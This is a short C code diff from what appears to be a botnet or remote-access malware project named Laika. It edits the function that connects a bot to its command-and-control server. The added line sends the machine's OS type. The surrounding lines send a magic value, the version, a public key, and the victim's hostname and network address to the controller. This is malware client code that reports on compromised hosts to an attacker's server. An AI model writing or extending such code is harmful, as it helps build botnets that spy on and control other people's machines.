@@ -115,6 +115,7 @@ void laikaB_connectToCNC(struct sLaika_bot *bot, char *ip, char *port) {
     laikaS_write(sock, LAIKA_MAGIC, LAIKA_MAGICLEN);
     laikaS_writeByte(sock, LAIKA_VERSION_MAJOR);
     laikaS_writeByte(sock, LAIKA_VERSION_MINOR);
+    laikaS_writeByte(sock, LAIKA_OSTYPE);
     laikaS_write(sock, bot->pub, sizeof(bot->pub)); /* write public key */
     laikaS_write(sock, bot->peer->hostname, LAIKA_HOSTNAME_LEN);
     laikaS_write(sock, bot->peer->inet, LAIKA_INET_LEN);
